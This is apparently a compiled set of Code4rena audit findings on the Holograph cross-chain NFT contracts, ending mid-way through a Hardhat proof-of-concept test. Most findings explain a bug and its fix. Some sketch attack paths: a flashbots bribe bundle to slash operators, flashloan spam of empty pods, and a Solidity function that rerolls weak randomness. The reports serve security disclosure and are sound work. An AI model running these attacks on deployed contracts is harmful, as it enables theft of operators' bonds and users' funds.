# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L920 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L924 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L928 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L932   # Vulnerability details  ## Impact  When user call unbondUtilityToken to unstake the token,   the function read the available bonded amount, and transfer back to the operator  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899  ```solidity /**  * @dev get current bonded amount by operator  */ uint256 amount = _bondedAmounts[operator]; /**  * @dev unset operator bond amount before making a transfer  */ _bondedAmounts[operator] = 0; /**  * @dev remove all operator references  */ _popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]); /**  * @dev transfer tokens to recipient  */ require(_utilityToken().transfer(recipient, amount), "HOLOGRAPH: token transfer failed"); ```  the logic is clean, but does not conform to the buisness requirement in the documentation, the doc said  https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection  >To move to a different pod, an Operator must withdraw and re-bond HLG. Operators who withdraw HLG will be charged a 0.1% fee, the proceeds of which will be burned or returned to the Treasury.  The charge 0.1% fee is not implemented in the code.  there are two incentive for bounded operator to stay,  the first is the reward incentive, the second is to avoid penalty with unbonding.  Without chargin the unstaking fee, the second incentive is weak and the operator can unbound or bond whenver they want  ## Proof of Concept  https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  we recommend charge the 0.1% unstaking fee to make the code align with the busienss requirement in the doc.  ```solidity /**  * @dev get current bonded amount by operator  */ uint256 amount = _bondedAmounts[operator]; uint256 fee = chargedFee(amount); // here amount -= fee;   /**  * @dev unset operator bond amount before making a transfer  */ _bondedAmounts[operator] = 0; /**  * @dev remove all operator references  */ _popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]); /**  * @dev transfer tokens to recipient  */ require(_utilityToken().transfer(recipient, amount), "HOLOGRAPH: token transfer failed"); ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/RaymondFam-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/zishansami-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/sakman-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Saintcode_-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/fatherOfBlocks-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/exolorkistis-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/mcwildy-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/adriro-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L329 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L419-L429   # Vulnerability details  ## Impact Failed job can't be recovered. NFT may be lost.  ## Proof of Concept ```solidity function executeJob(bytes calldata bridgeInRequestPayload) external payable { ... delete _operatorJobs[hash]; ...     try       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(         msg.sender,         bridgeInRequestPayload       )     {       /// @dev do nothing     } catch {       _failedJobs[hash] = true;       emit FailedOperatorJob(hash);     } } ```  First, it will `delete _operatorJobs[hash];` to have it not replayable.  Next, assume nonRevertingBridgeCall failed. NFT won't be minted and the catch block is entered.  _failedJobs[hash] is set to true and event is emitted  Notice that _operatorJobs[hash] has been deleted, so this job is not replayable. This mean NFT is lost forever since we can't retry executeJob.  ## Recommended Mitigation Steps Move `delete _operatorJobs[hash];` to the end of function executeJob covered in `if (!_failedJobs[hash])`  ```solidity ... if (!_failedJobs[hash]) delete _operatorJobs[hash]; ... ```  But this implementation is not safe. The selected operator may get slashed. Additionally, you may need to check _failedJobs flag to allow retry for only the selected operator.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0x1f8b-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/bobirichman-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Picodes-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/RedOneN-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/RedOneN-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Rolezn-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Rolezn-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Satyam_Sharma-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/abstract/ERC20H.sol#L106-L229   # Vulnerability details  ## Impact Contract ERC20H has payable functions (receive(), fallback(), etc.), but does not have a function to withdraw, therefore, every Ether sent to HolographERC20 will be lost.  ## Proof of Concept Contract functions and structure illustrate the concept.  ## Tools Used Slither  ## Recommended Mitigation Steps Remove the payable attribute or add a withdraw function.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/KoKo-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/KoKo-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/gogo-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354   # Vulnerability details  ## Impact Gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed.  ## Proof of Concept ```solidity require(gasPrice >= tx.gasprice, "HOLOGRAPH: gas spike detected"); ```  ```solidity         /**          * @dev select operator that failed to do the job, is slashed the pod base fee          */         _bondedAmounts[job.operator] -= amount;         /**          * @dev the slashed amount is sent to current operator          */         _bondedAmounts[msg.sender] += amount; ```  Since you have designed a mechanism to prevent other operators to slash the operator due to "the selected missed the time slot due to a gas spike". It can induce that operators won't perform their job if a gas price spike happens due to negative profit.  But your designed mechanism has a vulnerability. Other operators can submit their transaction to the mempool and queue it using `gasPrice in bridgeInRequestPayload`. It may get executed before the selected operator as the selected operator is waiting for the gas price to drop but doesn't submit any transaction yet. If it doesn't, these operators lose a little gas fee. But a slashed reward may be greater than the risk of losing a little gas fee.  ```solidity require(timeDifference > 0, "HOLOGRAPH: operator has time"); ```  Once 1 epoch has passed, selected operator is vulnerable to slashing and frontrunning.  ## Recommended Mitigation Steps Modify your operator node software to queue transactions immediately with `gasPrice in bridgeInRequestPayload` if a gas price spike happened. Or allow gas fee loss tradeoff to prevent being slashed.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/gianganhnguyen-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/csanuragjain-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Mathieu-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/durianSausage-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Bnke0x0-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Bnke0x0-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/leosathya-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/leosathya-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/m_Rassska-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/JC-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Deivitto-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Deivitto-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xNazgul-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L391 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L395   # Vulnerability details  Payout recipients can call `getEthPayout()` to transfer the ETH balance of the contract to all payout recipients. This function makes an internal call to `_payoutEth`, which sends the payment to the recipients based on their associated `bp`  The issue is that the `balance` used in the `transfer` calls is not the contract ETH balance, but the balance minus a `gasCost`.  This means `getEthPayout()` calls will leave dust in the contract.  ## Impact  If the dust is small enough, a subsequent call to `getEthPayout` is likely to revert because of [this check](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L390). And `enforcer/PA1D` does not have any other ETH withdrawal function. While `enforcer/PA1D` is meant to be used via delegate calls from a NFT collection contract, if the NFT contract does not have any withdrawal function either, this dust mentioned above is effectively lost.  ## Proof-Of-Concept  Let us take the example of a payout recipient trying to retrieve their share of the balance, equal to `40_000` For simplicity, assume one payout address, owned by Alice:  - Alice calls `getEthPayout()`, which in turn calls `_payoutEth()` - `gasCost = (23300 * length) + length = 23300 + 1 = 23301` - `balance = address(this).balance = 40000` - `balance - gasCost = 40000 - 23301 = 16699`, - `sending = ((bps[i] * balance) / 10000) = 10000 * 16699 / 10000 = 16699` - Alice receives `16699`.  Alice has to wait for the balance to increase to call `getEthPayout()` again. But no matter what, there will always be at least a dust of `10000` left in the contract.   ## Tools Used  Manual Analysis   ## Mitigation  The transfers should be done based on `address(this).balance`. The `gasCost` is redundant as the gas amount is specified by the caller of `getEthPayout()`, the contract does not have to provide gas.  ```diff -391: balance = balance - gasCost; 392:     uint256 sending; 393:     // uint256 sent; 394:     for (uint256 i = 0; i < length; i++) { 395:       sending = ((bps[i] * balance) / 10000); 396:       addresses[i].transfer(sending); 397:       // sent = sent + sending; 398:     } ```
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354   # Vulnerability details  ## Description Operators in Holograph do their job by calling executeJob() with the bridged in bytes from source chain.  If the primary job operator did not execute the job during his allocated block slot, he is punished by taking a single bond amount and transfer it to the operator doing it instead.  The docs and code state that if there was a gas spike in the operator's slot, he shall not be punished. The way a gas spike is checked is with this code in executeJob: ``` require(gasPrice >= tx.gasprice, "HOLOGRAPH: gas spike detected"); ```  However, there is still a way for operator to claim primary operator's bond amount although gas price is high. Attacker can submit a flashbots bundle including the executeJob() transaction, and one additional "bribe" transaction. The bribe transaction will transfer some incentive amount to coinbase address (miner), while the executeJob is submitted with a low gasprice. Miner will accept this bundle as it is overall rewarding enough for them, and attacker will receive the base bond amount from victim operator. This threat is not theoretical because every block we see MEV bots squeezing value from such opportunities.  info about coinbase [transfer](https://docs.flashbots.net/flashbots-auction/searchers/advanced/coinbase-payment) info about bundle [selection](https://docs.flashbots.net/flashbots-auction/searchers/advanced/bundle-pricing#bundle-ordering-formula)  ## Impact  Dishonest operator can take honest operator's bond amount although gas price is above acceptable limits.  ## Tools Used  Manual audit, flashbot docs  ## Recommended Mitigation Steps  Do not use current tx.gasprice amount to infer gas price in a previous block.  Probably best to use gas price oracle.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ajtra-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L467   # Vulnerability details  ## Description  HolographERC721.sol is an enforcer contract that fully implements ERC721. In its safeTransferFromFunction there is the following code: ``` if (_isContract(to)) {   require(     (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&       ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&       ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==       ERC721TokenReceiver.onERC721Received.selector),     "ERC721: onERC721Received fail"   ); } ``` If the target address is a contract, the enforcer requires the target's onERC721Received() to succeed. However, the call deviates from the [standard](https://eips.ethereum.org/EIPS/eip-721): ``` interface ERC721TokenReceiver {     /// @notice Handle the receipt of an NFT     /// @dev The ERC721 smart contract calls this function on the recipient     ///  after a `transfer`. This function MAY throw to revert and reject the     ///  transfer. Return of other than the magic value MUST result in the     ///  transaction being reverted.     ///  Note: the contract address is always the message sender.     /// @param _operator The address which called `safeTransferFrom` function     /// @param _from The address which previously owned the token     /// @param _tokenId The NFT identifier which is being transferred     /// @param _data Additional data with no specified format     /// @return `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`     ///  unless throwing     function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4); } ```  The standard mandates that the first parameter will be the operator - the caller of safeTransferFrom. The enforcer passes instead the address(this) value, in other words the Holographer address. The impact is that any bookkeeping done in target contract, and allow / disallow decision of the transaction, is based on false information.  ## Impact  ERC721 transferFrom's "to" contract may fail to accept transfers, or record credit of transfers incorrectly.   ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Pass the msg.sender parameter, as the ERC721 standard requires.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L962   # Vulnerability details  ## Description  HolographERC721.sol is an enforcer of the ERC721 standard. In its fallback function, it calls the actual implementation in order to handle additional logic.   If Holographer is called with no calldata and some msg.value, the call will reach the  receive() function, which does not forward the call down to the implementation.  This can be a serious value leak issue, because the underlying implementation may have valid behavior for handling sending of value. For example, it can mint the next available tokenID and credit it to the user. Since this logic is never reached, the entire msg.value is just leaked.  ## Impact  Leak of value when interacting with an NFT using the receive() or fallback() callback. Note that if NFT implements fallback OR receive() function, execution will never reach either of them from the enforcer's receive() function.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Funnel receive() empty calls down to the implementation.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L185 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L121   # Vulnerability details  ## Description  ERC20H and ERC721H are base contracts for NFTs / coins to inherit from. They supply the modifier onlyOwner and function isOwner which are used in the implementations for access control. However, there are several functions which when using these the answer may be corrupted to true by an attacker.  The issue comes from confusion between calls coming from HolographERC721's fallback function, and calls from actually implemented functions.   In the fallback function, the enforcer appends an additional 32 bytes of msg.sender : ``` assembly {   calldatacopy(0, 0, calldatasize())   mstore(calldatasize(), caller())   let result := call(gas(), sload(_sourceContractSlot), callvalue(), 0, add(calldatasize(), 32), 0, 0)   returndatacopy(0, 0, returndatasize())   switch result   case 0 {     revert(0, returndatasize())   }   default {     return(0, returndatasize())   } } ```  Indeed these are the bytes read as msgSender: ``` function msgSender() internal pure returns (address sender) {   assembly {     sender := calldataload(sub(calldatasize(), 0x20))   } } ```  and isOwner simply compares these to the stored owner: ``` function isOwner() external view returns (bool) {   if (msg.sender == holographer()) {     return msgSender() == _getOwner();   } else {     return msg.sender == _getOwner();   } } ```  However, the enforcer calls these functions directly in several locations, and in these cases it of course does not append a 32 byte msg.sender. For example, in safeTransferFrom: ``` function safeTransferFrom(   address from,   address to,   uint256 tokenId,   bytes memory data ) public payable {   require(_isApproved(msg.sender, tokenId), "ERC721: not approved sender");   if (_isEventRegistered(HolographERC721Event.beforeSafeTransfer)) {     require(SourceERC721().beforeSafeTransfer(from, to, tokenId, data));   }   _transferFrom(from, to, tokenId);   if (_isContract(to)) {     require(       (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&         ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&         ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==         ERC721TokenReceiver.onERC721Received.selector),       "ERC721: onERC721Received fail"     );   }   if (_isEventRegistered(HolographERC721Event.afterSafeTransfer)) {     require(SourceERC721().afterSafeTransfer(from, to, tokenId, data));   } } ```  Here, caller has arbitrary control of the data parameter, and can pass owner's address.When the implementation, SourceERC721(), gets called, beforeSafeTransfer / afterSafeTransfer will behave as if they are called by owner.  Therefore, depending on the actual implementation, derived contracts can lose funds by specifying owner-specific logic.   This pattern occurs with the following functions, which have an arbitrary data parameter: - beforeSafeTransfer / after SafeTransfer - beforeTransfer / afterTransfer - beforeOnERC721Received / afterOnERC721Received - beforeOnERC20Received / aferERC20Received  ## Impact  Owner-specific functionality can be initiated on NFT / ERC20 implementation contracts  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Refactor the code to represent msg.sender information in a bug-free way.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/brgltd-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L317 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L340   # Vulnerability details    ## Impact Payout is blocked and tokens are stuck in contract.  ## Proof of Concept `PA1D._payoutToken()` and `PA1D._payoutTokens()` call `ERC20.transfer()` in a require-statement to send tokens to a list of payout recipients. Some tokens do not return a bool (e.g. USDT, BNB, OMG) on ERC20 methods. But since the require-statement expects a `bool`, for such a token a `void` return will also cause a revert, despite an otherwise successful transfer. That is, the token payout will always revert for such tokens.  ## Tools Used Code inspection  ## Recommended Mitigation Steps Use [OpenZeppelin's SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol), which handles the return value check as well as non-standard-compliant tokens.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L431-L445   # Vulnerability details  ## Description  Holograph gets it's cross chain messaging primitives through Layer Zero. To get pricing estimate, it uses the DstConfig price struct exposed in LZ's [RelayerV2](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/RelayerV2.sol#L133)  The issue is that the important baseGas and gasPerByte configuration parameters, which are used to calculate a custom amount of gas for the destination LZ message, use the values that come from the *source* chain. This is in contrast to LZ which handles DstConfigs in a mapping keyed by chainID.  The encoded gas amount is described [here](https://layerzero.gitbook.io/docs/guides/advanced/relayer-adapter-parameters)  ## Impact  The impact is that when those fields are different between chains, one of two things may happen: 1. Less severe - we waste excess gas, which is refunded to the lzReceive() caller (Layer Zero) 2. More severe - we underprice the delivery cost, causing lzReceive() to revert and the NFT stuck in limbo forever.  The code does not handle a failed lzReceive (differently to a failed executeJob). Therefore, no failure event is emitted and the NFT is screwed.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Firstly,make sure to use the target gas costs. Secondly, re-engineer lzReceive to be fault-proof, i.e. save some gas to emit result event.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Josiah-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L539   # Vulnerability details  ## Description  HolographERC20 is the ERC20 enforcer for Holograph. In  the safeTransferFrom operation, it calls \_checkOnERC20Received:  ``` if (_isEventRegistered(HolographERC20Event.beforeSafeTransfer)) {   require(SourceERC20().beforeSafeTransfer(account, recipient, amount, data)); } _transfer(account, recipient, amount); require(_checkOnERC20Received(account, recipient, amount, data), "ERC20: non ERC20Receiver"); if (_isEventRegistered(HolographERC20Event.afterSafeTransfer)) {   require(SourceERC20().afterSafeTransfer(account, recipient, amount, data)); } ```  The checkOnERC20Received function: ``` if (_isContract(recipient)) {   try ERC165(recipient).supportsInterface(ERC165.supportsInterface.selector) returns (bool erc165support) {     require(erc165support, "ERC20: no ERC165 support");     // we have erc165 support     if (ERC165(recipient).supportsInterface(0x534f5876)) {       // we have eip-4524 support       try ERC20Receiver(recipient).onERC20Received(address(this), account, amount, data) returns (bytes4 retv         return retval == ERC20Receiver.onERC20Received.selector;       } catch (bytes memory reason) {         if (reason.length == 0) {           revert("ERC20: non ERC20Receiver");         } else {           assembly {             revert(add(32, reason), mload(reason))           }         }       }     } else {       revert("ERC20: eip-4524 not supported");     }   } catch (bytes memory reason) {     if (reason.length == 0) {       revert("ERC20: no ERC165 support");     } else {       assembly {         revert(add(32, reason), mload(reason))       }     }   } } else {   return true; } ```  In essence, if the target is a contract, the enforcer requires it to fully implement EIP-4524. The problem is that [this](https://eips.ethereum.org/EIPS/eip-4524) EIP is just a draft proposal, which the project cannot assume to be supported by any receiver contract, and definitely not every receiver contract.  The specs warn us: ``` ⚠️ This EIP is not recommended for general use or implementation as it is likely to change.  ```  Therefore, it is a very dangerous requirement to add in an ERC20 enforcer, and must be left to the implementation to do if it so desires.  ## Impact  ERC20s enforced by HolographERC20 are completely uncomposable. They cannot be used for almost any DeFi application, making it basically useless.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Remove the EIP-4524 requirements altogether.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L875   # Vulnerability details  ## Description  Operators are organized into different pod tiers. Every time a new request arrives, it is scheduled to a random available pod. It is important to note that pods may be empty, in which case the pod array actually has a single zero element to help with all sorts of bugs. When a pod of a non existing tier is created, any intermediate tiers between the current highest tier to the new tier are filled with zero elements. This happens at bondUtilityToken():  ``` if (_operatorPods.length < pod) {   /**    * @dev activate pod(s) up until the selected pod    */   for (uint256 i = _operatorPods.length; i <= pod; i++) {     /**      * @dev add zero address into pod to mitigate empty pod issues      */     _operatorPods.push([address(0)]);   } } ```  The issue is that any user can spam the contract with a large amount of empty operator pods. The attack would look like this:  1. bondUtilityToken(attacker, large_amount, high_pod_number) 2. unbondUtilityToken(attacker, attacker)  The above could be wrapped in a flashloan to get virtually any pod tier filled.  The consequence is that when the scheduler chooses pods uniformally, they will very likely choose an empty pod, with the zero address. Therefore, the chosen operator will be 0, which is referred to in the code as "open season". In this occurrance, any operator can perform the executeJob() call. This is of course really bad, because all but one operator continually waste gas for executions that will be reverted after the lucky first transaction goes through. This would be a practical example of a griefing attack on Holograph.   ## Impact  Any user can force chaotic "open season" operator behavior  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  It is important to pay special attention to the scheduling algorithm, to make sure different pods are given execution time according to the desired heuristics.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/m_Rassska-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ajtra-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L491-L511   # Vulnerability details  ## Impact Using block.number and block.timestamp as a source of randomness is commonly advised against, as the outcome can be manipulated by calling contracts. In this case a compromised layer-zero-endpoint would be able to retry the selection of the primary operator until the result is favorable to the malicious actor.  ## Proof of Concept An attack path for rerolling the result of bad randomness might look roughly like this:  ```js function attack(uint256 currentNonce, uint256 wantedPodIndex, uint256 numPods, uint256 wantedOperatorIndex, uint256 numOperators,  bytes calldata bridgeInRequestPayload) external{      bytes32 jobHash = keccak256(bridgeInRequestPayload);      //same calculation as in HolographOperator.crossChainMessage     uint256 random = uint256(keccak256(abi.encodePacked(jobHash, currentNonce, block.number, block.timestamp)));      require(wantedPodIndex == random % numPods)     require(wantedOperatorIndex == random % numOperators);      operator.crossChainMessage(bridgeInRequestPayload); } ```  The attack basically consists of repeatedly calling the `attack` function with data that is known and output that is wished for until the results match and only then continuing to calling the operator.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps Consider using a decentralized oracle for the generation of random numbers, such as [Chainlinks VRF](https://docs.chain.link/docs/vrf/v2/introduction/).  It should be noted, that in this case there is a prerequirement of the layer-zero endpoint being compromised, which confines the risk quite a bit, so using a normally unrecommended source of randomness could be acceptable here, considering the tradeoffs of integrating a decentralized oracle.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xSmartContract-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/rotcivegaf-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/nicobevi-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/rotcivegaf-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439 https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478   # Vulnerability details  ## Impact ETH can be sent when calling the `HolographOperator` contract's `executeJob` function, which can execute the following code. ```solidity File: contracts\HolographOperator.sol 419:     try 420:       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}( 421:         msg.sender, 422:         bridgeInRequestPayload 423:       ) 424:     { 425:       /// @dev do nothing 426:     } catch { 427:       _failedJobs[hash] = true; 428:       emit FailedOperatorJob(hash); 429:     } ```  Executing the `try ... {...} catch {...}` code mentioned above will execute `HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(...)`. Calling the `nonRevertingBridgeCall` function can possibly execute `revert(0, 0)` if the external call to the bridge contract is not successful. When this occurs, the code in the `catch` block of the `try ... {...} catch {...}` code mentioned above will run, which does not make calling the `executeJob` function revert. As a result, even though the job is not successfully executed, the sent ETH is locked in the `HolographOperator` contract since there is no other way to transfer such sent ETH out from this contract. In this situation, the operator that calls the `executeJob` function will lose the sent ETH.  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439 ```solidity   function executeJob(bytes calldata bridgeInRequestPayload) external payable {          ...      /**      * @dev execute the job      */     try       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(         msg.sender,         bridgeInRequestPayload       )     {       /// @dev do nothing     } catch {       _failedJobs[hash] = true;       emit FailedOperatorJob(hash);     }     /**      * @dev every executed job (even if failed) increments total message counter by one      */     ++_inboundMessageCounter;     /**      * @dev reward operator (with HLG) for executing the job      * @dev this is out of scope and is purposefully omitted from code      */     ////  _bondedOperators[msg.sender] += reward;   } ```  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478 ```solidity   function nonRevertingBridgeCall(address msgSender, bytes calldata payload) external payable {     require(msg.sender == address(this), "HOLOGRAPH: operator only call");     assembly {       /**        * @dev remove gas price from end        */       calldatacopy(0, payload.offset, sub(payload.length, 0x20))       /**        * @dev hToken recipient is injected right before making the call        */       mstore(0x84, msgSender)       /**        * @dev make non-reverting call        */       let result := call(         /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value         mload(sub(payload.length, 0x40)),         /// @dev destination is bridge contract         sload(_bridgeSlot),         /// @dev any value is passed along         callvalue(),         /// @dev data is retrieved from 0 index memory position         0,         /// @dev everything except for last 32 bytes (gas limit) is sent         sub(payload.length, 0x40),         0,         0       )       if eq(result, 0) {         revert(0, 0)       }       return(0, 0)     }   } ```  ## Proof of Concept First, please add the following `OperatorAndBridgeMocks.sol` file in `src\mock\`. ```solidity pragma solidity 0.8.13;  // OperatorMock contract simulates the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions contract OperatorMock {     bool public isJobExecuted = true;      BridgeMock bridgeMock = new BridgeMock();      // testExecuteJob function here simulates the logic flow used in HolographOperator.executeJob function     function testExecuteJob() external payable {         try IOperatorMock(address(this)).testBridgeCall{value: msg.value}() {         } catch {             isJobExecuted = false;         }     }          // testBridgeCall function here simulates the logic flow used in HolographOperator.nonRevertingBridgeCall function     function testBridgeCall() external payable {         // as a simulation, the external call that sends ETH to bridgeMock contract will revert         (bool success, ) = address(bridgeMock).call{value: msg.value}("");         if (!success) {             assembly {                 revert(0, 0)             }         }         assembly {             return(0, 0)         }     } }  interface IOperatorMock {     function testBridgeCall() external payable; }  contract BridgeMock {     receive() external payable {         revert();     } } ```  Then, please add the following `POC.ts` file in `test\`. ```typescript import { expect } from "chai"; import { ethers } from "hardhat";  describe('POC', () => {     it("It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function", async () => {         // deploy operatorMock contract that simulates         //   the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions         const OperatorMockFactory = await ethers.getContractFactory('OperatorMock');         const operatorMock = await OperatorMockFactory.deploy();         await operatorMock.deployed();          await 